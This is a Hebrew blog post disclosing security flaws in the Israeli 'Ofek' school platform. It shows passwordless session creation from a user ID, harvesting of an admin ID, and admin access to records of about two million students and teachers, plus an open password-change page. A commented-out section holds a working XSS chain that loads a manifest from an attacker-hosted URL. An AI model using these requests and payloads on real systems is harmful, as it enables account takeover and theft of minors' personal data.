---
layout: post
title: אופק - בעיות אבטחה 2.0
tags: [web, xss, information disclosure, unauthorized access]
---

אפתח ואספר שזו לא הפעם הראשונה בה אני מחפש בעיות אבטחה באתר "[אופק](https://ebag.cet.ac.il)", לפני כשנה יצא לי לדווח על [מספר בעיות](/2018/11/06/ofek-issues.html). החלטתי לנסות להגיע להישג יותר משמעותי מכיוון שראיתי בעבר בעיות רבות, הצבתי לעצמי מטרה: **להגיע לרשומות התלמידים במערכת**

~~ספוילר: שני מיליון בני אדם זה די הרבה לא חושבים ?~~

<!--more-->

### התחברות ללא שם משתמש וסיסמה:
בדיווח הקודם הצגתי מערכת בעייתית בה גורם זדוני יכול לבצע התחברות לחשבון ללא צורך בשם משתמש וסיסמה על ידי שליחת בקשה המכילה מזהה משתמש ל-`endpoint` בשרת המאפשר ליצור `session` לאותו המשתמש:

```http
POST https://ebag.cet.ac.il/api/users/createSession HTTP/1.1

{"userID": "9f4f5c31-103d-4d3b-9789-XXXXXXXXXXXX"}
```

במידה ומזהה המשתמש תקין התשובה לבקשה זו תכיל את `session token` המאפשר התחברות לאתר.  
על ידי החלפה של של עוגית ה `session` הנקראת `CetSession` בטוקן המוחזר מהשרת  וטעינה חוזרת של העמוד, האתר יחבר אותנו למשתמש הרצוי

![]({{ site.baseurl }}/assets/ofek-images/single-cookie-edit.png)

**מסתבר ששנה לאחר ה"תיקון", הבעיה לא באמת תוקנה אלא רק הדרך בה הלקוח מתחבר שונתה, מה שהשאיר את ה `endpoint` פעיל אך לא חשוף.**

### גישה לפרטי התלמידים והמורים (מעל כשני מיליון בני אדם):

מכיוון שכרגע ידוע לנו על דרך להתחבר רק בעזרת מזהה המשתמש נוכל לנקוט בשתי שיטות:
1. לבצע `bruteforce` שבו ננסה מזהי משתמש רנדומליים (לא יעיל במיוחד מכיוון שמדובר פה על `uuid`)
2. לחפש באתר אזכורים למזהי משתמשים בנקודות ב `api` השונה

### רגע, אז מה אנחנו באמת מחפשים ?
ידוע לנו כי אתר אופק מכיל מערכת ניהול תוכן, לכן נוכל לצאת מתוך הנחה שיש לכל משתמש הרשאות ותפקיד במערכת, נוכל לאמת זאת על ידי צפייה בתשובה המוחזרת מן השרת לאחר יצירת ה `session`, גוף התשובה מכיל את המפתח `userRole` וערכו הוא `student`.

```json
{
    "value":
    {
        "user":
        {
            "userRole": "student",
        }
    }
    ...
}
```

הרעיון ההגיוני ביותר הוא להגיע למשתמש בעל תפקיד ה `admin` מכיוון שהסבירות שלמשתמש זה יש הרשאות גבוהות היא די טובה.

### אז איפה להתחיל לחפש ?
המחשבה הראשונה שעלתה לי בראש היא חיפוש תחת משימות ההגשה שלי

![]({{ site.baseurl }}/assets/ofek-images/my-tasks.png)

נכנסתי לאחת מן המשימות בדף, פתחתי את כלי המעקב אחרי פעילות הרשת והבחנתי בבקשה הזו:

![]({{ site.baseurl }}/assets/ofek-images/task-techer-id.png)

ניתן לראות פה את מזהה המשתמש של יוצר המשימה, במקרה זה, המורה שלי לביולוגיה.
נוכל להשתמש בבעיה אשר הוצגה מקודם המאפשרת חיבור משתמש ללא סיסמה ונשלח לשרת את מזהה המשתמש, נבחן את גוף הבקשה ונוכל לראות מה תפקידו של המשתמש ואף להיכנס לחשבונו על מנת לבדוק אילו אופציות ניתנות לו.

**מכיוון שהחלטתי לא להיכנס למשתמש של המורה שלי אני משער שבמקרה זה נוכל לשלוח משימות לתלמידי הכיתה ולשנות את ציוני המשימות (תכונות אלו אמנם מעניינות אך לא מספקות את המטרה שלנו, נמשיך לחפש)**

לאחר רפרוף בדפי האתר נוכל להבחין בבקשה היוצאת מן האתר בכתובת

```
https://productplayer.cet.ac.il/ScienceCell/
```

```http
GET https://documentservice.cet.ac.il/api/documentRevisions/65adca33-b018-4519-b4b6-6c88d68aee0b/he/1/6 HTTP/1.1
```

כאשר מסתכלים על גוף הבקשה ניתן לראות תוכן הקשור למסמך המדובר, אך אנחנו מעוניינים במציאת מזהה משתמש, נוכל להבחין בשדה בשם `createdBy` ולהסיק שמדובר במזהה של האדם שיצר את המסמך

```json
{
    "createdBy": "0d9da50b-4b37-4c64-XXXX-XXXXXXXXXXXX"
}
```

נבצע את התהליך המאפשר להתחבר ללא סיסמה ושם משתמש ונקבל

```json
{
    "value":
    {
        "user":
        {
            "token": "a94cd910-3456-475a-XXXX-XXXXXXXXXXXX",
            "userRole": "admin",
        }
    }
    ...
}
```

מעולה ! מצאנו משתמש בעל תפקיד `admin`, עכשיו רק נשאר להחליף את תוכן העוגיה ב`token` אשר קיבלנו מגוף הבקשה ולנסות להבין באילו פיצ'רים אנו יכולים להשתמש

לאחר הכניסה למשתמש נוכל להבחין באופצית ניהול המשתמשים

![]({{ site.baseurl }}/assets/ofek-images/user-management.png)

נכנס לדף זה ונראה את מערכת הניהול של בתי הספר ובה אפשרויות כמו הוספת בתי ספר והסרתם, צפייה בנתוני בתי ספר קיימים.
המערכת מאפשרת לנו עריכה של נתוני תלמידים ומורים, החלפת סיסמאות, התחברות כאחד מן התלמידים או המורים לאתר ללא סיסמה.

![]({{ site.baseurl }}/assets/ofek-images/schools.png)

ניתן לצפות בנתוני המורים:
- שם מלא
- תעודת זהות
- תפקיד


ניתן להוריד את נתוני בית הספר כקובץ אקסל (או להשתמש בממשק הוובי) המכיל את רישום התלמידים ובו:
- תעודת זהות
- שם מלא
- מין
- שם בית הספר (המוביל אל עיר המגורים)
- שכבת הלימוד ומספר הכיתה
- מייל
- שם משתמש
- סיסמה (`האש`)

בתי ספר במערכת: 4841  
תלמידים: 1,867,527  
מורים: 264,352  
מספר אנשים כולל: 2,131,879  

**קיימת אפשרות מועילה המאפשרת לקשר את נתוני האתר למנב"ס (מערכת אינטרנטית לניהול בתי ספר בשימוש רב במשרד החינוך) אשר דואגת לסינכרון תמידי של הפרטים**

![]({{ site.baseurl }}/assets/ofek-images/excel.png)
<small>קובץ האקסל המסויים שהורדתי מן האתר מכיל נתונים על כל תלמידי בית הספר שלי</small>

![]({{ site.baseurl }}/assets/ofek-images/school-teachers.png)

ניתנת לנו האפשרות להתחבר לכל משתמשי האתר:

![]({{ site.baseurl }}/assets/ofek-images/login-as-other-user.png)

### גישה ל cms של האתר:
די הגיוני שלאחר שהגענו למשתמש האדמין נוכל לנהל את תוכן האתר ולשנות את הפרטים המוצגים בדף הבית לכלל המשתמשים הנכנסים לאתר

![]({{ site.baseurl }}/assets/ofek-images/edit-panel.png)

{% comment %}
### reflected xss וחטיפת סשין:
לאחר הסתכלות באתר הגעתי לדף שאמור להציג מסמכים

```
https://mybag.ofakim.cet.ac.il/content/player.aspx?manifest={docment_path}
```

חשדתי ישר כאשר ראיתי את שדה ה `manifest` בפרמטרים של הבקשה והחלטתי לחקור קצת  
ניסתי לראות מה קורה כאשר אני מכניס `url` שונה כערך הפרמטר ולפתע ראיתי בקשה בכלי התקשורת של כרום, עכשיו רק צריך להבין מאיפה הבקשה נשלחת באמת...

![]({{ site.baseurl }}/assets/ofek-images/xss-page.png)

הסתכלתי על קוד המקור של העמוד והגעתי לקובץ ה`js` הבא:

```
https://mybag.ofakim.cet.ac.il/content/js/player.host.js
```

לאחר חיפוש מהיר בקובץ הבחנתי בקוד המבצע את הבקשה לכתובת שלנו

```javascript
function loadContent() {
    var manifestUrl = Helpers.getParameterByName('manifest');
    ...
    loadManifest(manifestUrl)
        .fail(function() {
            $('<iframe></iframe>)')
                .width('100%')
                .height('100%')
                .attr('src', manifestUrl)
                .prependTo(
                    $(document.body)
                    .width('100%').height('100%')
                    .css('background-color', 'transparent').empty()
                );
        }).done(function() {
            var m = cet.player.manifest;
            if (m.exit) {
                location.href = m.exit;
                return;
            }
            ...
        });
}

function loadManifest(manifestUrl) {
    return jQuery.ajax({
        url: manifestUrl,
        dataType: 'json',
        cache: false
    }).done(function(data) {
        cet.player.manifest = data;
    });
}
```

התהליך המתבצע פה די פשוט:
1. בהתחלה נקרא לפונקציה `loadManifest` ונעביר לה כערך את כתובת ה`manifest` שלנו
2. מהפונקציה `loadManifest` נשלחת בקשה לשרת ובמידה ומוחזר בגוף התשובה `json` הוא נשמר תחת `cet.player.manifest`
    - במידה והבקשה נכשלת נועבר לפעולת ה `fail callback` ונוכל להבחין בכך שהכתובת שהכנסנו מוכנסת ל`iframe`, לפי זה נוכל לנסות לטעון את הכתובת הבאה `javascript:alert(1)` אך לצערנו מערכת ה waf של האתר תחסום אותנו, ניתן לנסות כרגע טעינה של כתובת המקודדת כ `base64` כגון:
    ```
    data:text/html;base64,PHNjcmlwdD5hbGVydCh3aW5kb3cudG9wLmRvY3VtZW50KTs8L3NjcmlwdD4=
    ```
    אך כרום יחסום אותנו מקריאה של תוכן העוגיות של הורה ה `iframe` ולכן נשלול את האופציה הזו
3. ניתן להבחין כי במידה והכתובת נטענה בהצלחה וקיים בתוכן הקובץ (`json`) שדה בשם exit הדפדן ינסה לבצע `redirect` אל ערך השדה ופה נוכל לנצל את המנגון הזה.

#### ניצול המנגון:
מכיוון שאנו יודעים כי `location.href` מאפשר לנו לטעון כתובת המכילות את הקידמות `javascript:` המאפשרות הרצת קוד על הדף הנוכחי  
ניתן להרים שרת ובו קובץ המכיל את התוכן הבא:

```json
{
    "exit": "javascript:alert(document.cookie)"
}
```

לאחר מכן נוכל לפנות אל הכתובת הבאה ולקבל הרצת קוד

```
https://mybag.ofakim.cet.ac.il/content/player.aspx?manifest=https://{attacker_url}/file.json
```

<iframe width="560" height="500" src="https://www.youtube.com/embed/B9UGuw-IEGc" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
{% endcomment %}

### שינוי סיסמה למשתמשים שונים וצפייה בפרטיהם:
* הבעיה ניתנת לניצול ללא תלות במשתמש האדמין (כל משתמש אשר מחובר למערכת יכול לבצע תהליך זה)

במהלך החיפוש באתר הגעתי לכתובת הבאה:

```
https://accounts.cet.ac.il/ChangeUserPassword.aspx
```
הבחנתי בהתנהגות מוזרה, משתמש ללא הרשאות (תלמיד אחר במערכת) יכול לעדכן למשתמשים מסוימים את סיסמתם, בנוסף ברגע שמזינים מזהה משתמש לתיבת החיפוש, מוחזרים אל הדפדפן פרטים על המשתמש:
- שם מלא
- תעודת זהות
- חשבונות מייל משוייכים

ניצול בעיה זו יכול להתממש בשתי דרכים:
1. כניסה למשתמשים ששמות המשתמש שלהם ידועים
2. ביצוע אנומרצית משתמשים (פשוט `bruteforce` עד שנגיע ל מזהה משתמש קיים)

![]({{ site.baseurl }}/assets/ofek-images/change-pass.png)